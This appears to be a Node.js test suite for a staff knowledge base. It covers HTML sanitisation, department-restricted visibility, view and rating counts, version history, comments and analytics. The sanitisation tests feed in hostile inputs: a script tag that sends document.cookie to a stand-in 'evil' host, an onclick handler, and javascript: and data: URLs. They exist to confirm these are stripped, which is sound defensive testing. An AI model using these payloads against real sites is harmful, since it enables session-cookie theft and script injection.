// 7.2 — the knowledge base.
//
// The security property is the reason this file exists. KB articles are
// rich HTML written by staff and rendered back with `v-html`, so whatever
// the server stores is what every reader's browser executes. News avoids
// the problem by being plain text; a procedure with headings and tables
// cannot, so the allowlist is the whole defence.
//
// The rest is about the base failing quietly: an article nobody can see
// must not be distinguishable from one that does not exist, a reopened
// article is not a second reader, and "was this helpful" must replace one
// person's answer rather than stack it.

import { test, describe, before, after } from 'node:test'
import assert from 'node:assert/strict'
import mongoose from 'mongoose'
import { connectDatabase } from '../src/config/db.js'
import { KbArticle } from '../src/models/kbArticle.model.js'
import { KbArticleVersion } from '../src/models/kbArticleVersion.model.js'
import { KbCategory } from '../src/models/kbCategory.model.js'
import { KbView } from '../src/models/kbView.model.js'
import { KbComment } from '../src/models/kbComment.model.js'
import { User } from '../src/models/user.model.js'
import { Role } from '../src/models/role.model.js'
import { hashPassword } from '../src/utils/hash.js'
import { kbService } from '../src/services/kb/kb.service.js'
import { sanitizeArticleBody, toPlainText } from '../src/services/kb/kbSanitize.js'
import { redisConnection } from '../src/config/redis.js'

const stamp = String(Date.now()).slice(-9)
const SECRET_DEPT = `Rahbariyat-${stamp}`

let author
let insider
let outsider
let category
let openArticle
let secretArticle
const userIds = []

const authorActor = () => ({ id: author._id.toString(), roleName: 'SUPERADMIN', permissions: ['news:manage'] })
const insiderActor = () => ({ id: insider._id.toString(), roleName: 'EMPLOYEE', permissions: [] })
const outsiderActor = () => ({ id: outsider._id.toString(), roleName: 'EMPLOYEE', permissions: [] })

async function makeUser(name, department = '') {
  const user = await User.create({
    firstName: name,
    lastName: 'Kb',
    fullName: `${name} Kb`,
    jshshir: `15${userIds.length}${stamp}`,
    passwordHash: await hashPassword('KbTest123!'),
    roleId: (await Role.findOne({ name: 'EMPLOYEE' }))._id,
    department,
  })
  userIds.push(user._id)
  return user
}

describe('knowledge base (7.2)', () => {
  before(async () => {
    await connectDatabase()
    assert.ok(await Role.findOne({ name: 'EMPLOYEE' }), 'EMPLOYEE role is missing — boot the server once')

    author = await makeUser('Muallif', SECRET_DEPT)
    insider = await makeUser('Ichki', SECRET_DEPT)
    outsider = await makeUser('Oddiy')

    const created = await kbService.createCategory(authorActor(), { name: `Procedures ${stamp}` })
    category = created.id
  })

  after(async () => {
    const articles = await KbArticle.find({ title: new RegExp(stamp) }, { _id: 1 }).lean()
    const ids = articles.map((row) => row._id)
    await Promise.all([
      KbArticleVersion.deleteMany({ articleId: { $in: ids } }),
      KbView.deleteMany({ articleId: { $in: ids } }),
      KbComment.deleteMany({ articleId: { $in: ids } }),
    ])
    await KbArticle.deleteMany({ _id: { $in: ids } })
    await KbCategory.deleteOne({ _id: category })
    await User.deleteMany({ _id: { $in: userIds } })
    await mongoose.connection.close()
    await redisConnection.quit()
  })

  describe('sanitisation', () => {
    test('a script tag never reaches storage', async () => {
      const article = await kbService.create(authorActor(), {
        title: `Sanitised ${stamp}`,
        body: '<p>Step one</p><script>fetch("//evil/"+document.cookie)</script>',
        categoryId: category,
        status: 'PUBLISHED',
      })
      const stored = await KbArticle.findById(article.id).lean()
      assert.ok(!stored.body.includes('<script'))
      assert.ok(stored.body.includes('<p>Step one</p>'))
      openArticle = stored
    })

    test('an event handler is stripped but the text survives', () => {
      // Dropping the whole paragraph would lose the author's work over one
      // pasted attribute; dropping the attribute keeps both safe and useful.
      const clean = sanitizeArticleBody('<p onclick="steal()">Wear the harness</p>')
      assert.equal(clean, '<p>Wear the harness</p>')
    })

    test('javascript: and data: urls are refused', () => {
      assert.ok(!sanitizeArticleBody('<a href="javascript:alert(1)">x</a>').includes('javascript:'))
      // data: is the one people forget — it can carry a whole document.
      assert.ok(!sanitizeArticleBody('<img src="data:text/html;base64,PHN2Zz4=">').includes('data:'))
    })

    test('inline style is dropped, because it can cover the whole page', () => {
      const clean = sanitizeArticleBody('<div style="position:fixed;inset:0;z-index:9999">overlay</div>')
      assert.ok(!clean.includes('style'))
      assert.ok(clean.includes('overlay'))
    })

    test('links are forced to open safely, whatever the author wrote', () => {
      const clean = sanitizeArticleBody('<a href="https://example.com" target="_self">x</a>')
      assert.match(clean, /rel="noopener noreferrer"/)
      assert.match(clean, /target="_blank"/)
    })

    test('the formatting a procedure actually needs survives', () => {
      const html = '<h2>Steps</h2><ol><li>One</li></ol><table><tr><td colspan="2">A</td></tr></table>'
      assert.equal(sanitizeArticleBody(html), html)
    })

    test('the search text is the words, not the markup', () => {
      // Indexing HTML matches `<strong>` as a word and misses a term split
      // across a tag boundary.
      assert.equal(toPlainText('<p>mehnat <b>muhofazasi</b></p>'), 'mehnat muhofazasi')
    })
  })

  describe('who can see what', () => {
    before(async () => {
      secretArticle = await kbService.create(authorActor(), {
        title: `Maxfiy protsedura ${stamp}`,
        body: '<p>Secret</p>',
        department: SECRET_DEPT,
        status: 'PUBLISHED',
      })
    })

    test('somebody in the department sees it', async () => {
      const { items } = await kbService.list(insiderActor(), {})
      assert.ok(items.some((item) => item.id === secretArticle.id))
    })

    test('somebody outside it does not — not even the title', async () => {
      const { items } = await kbService.list(outsiderActor(), {})
      assert.equal(items.find((item) => item.id === secretArticle.id), undefined)
    })

    test('opening it directly is a 404, not a 403', async () => {
      // A 403 confirms the article exists, which is the thing the title was
      // being hidden for in the first place (AT-24's rule).
      const stored = await KbArticle.findById(secretArticle.id).lean()
      await assert.rejects(
        () => kbService.getBySlug(outsiderActor(), stored.slug),
        (error) => error.statusCode === 404
      )
    })

    test('a draft is invisible to everybody but the editors', async () => {
      const draft = await kbService.create(authorActor(), {
        title: `Draft ${stamp}`,
        body: '<p>Not ready</p>',
        status: 'DRAFT',
      })
      const employeeView = await kbService.list(insiderActor(), {})
      assert.equal(employeeView.items.find((item) => item.id === draft.id), undefined)

      const editorView = await kbService.list(authorActor(), {})
      assert.ok(editorView.items.some((item) => item.id === draft.id))
    })
  })

  describe('reading', () => {
    test('opening it records a view and counts it once', async () => {
      await kbService.getBySlug(insiderActor(), openArticle.slug)
      await kbService.getBySlug(insiderActor(), openArticle.slug)
      await kbService.getBySlug(outsiderActor(), openArticle.slug)

      const stored = await KbArticle.findById(openArticle._id).lean()
      // Reopening it is the same person reading again, not a second reader.
      assert.equal(stored.viewCount, 2)
      assert.equal(await KbView.countDocuments({ articleId: openArticle._id }), 2)
    })

    test('"was this helpful" replaces the answer rather than stacking it', async () => {
      await kbService.rate(insiderActor(), openArticle._id, true)
      await kbService.rate(insiderActor(), openArticle._id, true)
      let stored = await KbArticle.findById(openArticle._id).lean()
      assert.equal(stored.helpfulCount, 1)

      // Changing their mind moves the count across, not up.
      await kbService.rate(insiderActor(), openArticle._id, false)
      stored = await KbArticle.findById(openArticle._id).lean()
      assert.equal(stored.helpfulCount, 0)
      assert.equal(stored.notHelpfulCount, 1)
    })
  })

  describe('history', () => {
    test('editing the body stores what it said before', async () => {
      await kbService.update(authorActor(), openArticle._id, {
        body: '<p>Step one, revised</p>',
        changeNote: 'Corrected the torque figure',
      })
      const { items } = await kbService.versions(openArticle._id)
      assert.equal(items.length, 2)
      assert.equal(items[0].version, 2)
      assert.equal(items[0].changeNote, 'Corrected the torque figure')
      // The old wording is still readable — "what did this say in March"
      // is the question a knowledge base has to answer.
      const first = await KbArticleVersion.findOne({ articleId: openArticle._id, version: 1 }).lean()
      assert.ok(first.body.includes('Step one'))
    })

    test('retagging is not a new version of the procedure', async () => {
      const before = (await KbArticle.findById(openArticle._id).lean()).version
      await kbService.update(authorActor(), openArticle._id, { tags: ['safety'] })
      const after = (await KbArticle.findById(openArticle._id).lean()).version
      assert.equal(after, before)
    })

    test('an edit is sanitised too, not only the first write', async () => {
      await kbService.update(authorActor(), openArticle._id, { body: '<p>ok</p><script>x</script>' })
      const stored = await KbArticle.findById(openArticle._id).lean()
      assert.ok(!stored.body.includes('<script'))
    })
  })

  describe('comments', () => {
    test('a correction lands on the article, not in somebody’s inbox', async () => {
      await kbService.comment(insiderActor(), openArticle._id, { body: 'Step 3 is out of date' })
      const { items } = await kbService.comments(openArticle._id)
      assert.equal(items.length, 1)
      assert.equal(items[0].fullName, insider.fullName)
    })

    test('an editor can mark it handled', async () => {
      const { items } = await kbService.comments(openArticle._id)
      await kbService.resolveComment(authorActor(), items[0].id)
      const after = await kbService.comments(openArticle._id)
      assert.ok(after.items[0].resolvedAt)
    })
  })

  describe('analytics', () => {
    test('surfaces what nobody reads and what people call unhelpful', async () => {
      // A knowledge base fails quietly: the article that is out of date is
      // the one nobody flags, and the one nobody opens answers a question
      // people do not have.
      const report = await kbService.analytics()
      assert.ok(report.total >= 2)
      assert.ok(Array.isArray(report.leastRead))
      assert.ok(report.unhelpful.some((item) => item.id === String(openArticle._id)))
    })

    test('the table rows carry author, viewers and the positive share (rasn 19)', async () => {
      const report = await kbService.analytics()
      const row = report.items.find((item) => item.id === String(openArticle._id))
      assert.ok(row, 'the open article is in the table')
      assert.equal(row.authorName, author.fullName)
      assert.equal(typeof row.usersViewed, 'number')
      assert.ok(row.usersViewed >= 1)
      assert.equal(typeof report.totalViews, 'number')
      assert.equal(typeof report.audience, 'number')
      // One "not helpful" vote and no "helpful": 0%, not null.
      assert.equal(row.helpfulPercent, 0)
    })
  })

  describe('trash', () => {
    test('a deleted article is in the trash and comes back on restore', async () => {
      const article = await kbService.create(authorActor(), {
        title: `Trashed ${stamp}`,
        body: '<p>gone</p>',
        categoryId: category,
        status: 'PUBLISHED',
      })
      await kbService.remove(authorActor(), article.id)
      let trash = await kbService.trash()
      assert.ok(trash.items.some((item) => item.id === article.id))
      const restored = await kbService.restore(authorActor(), article.id)
      assert.equal(restored.id, article.id)
      trash = await kbService.trash()
      assert.ok(!trash.items.some((item) => item.id === article.id))
      await assert.rejects(() => kbService.restore(authorActor(), article.id))
    })
  })
})
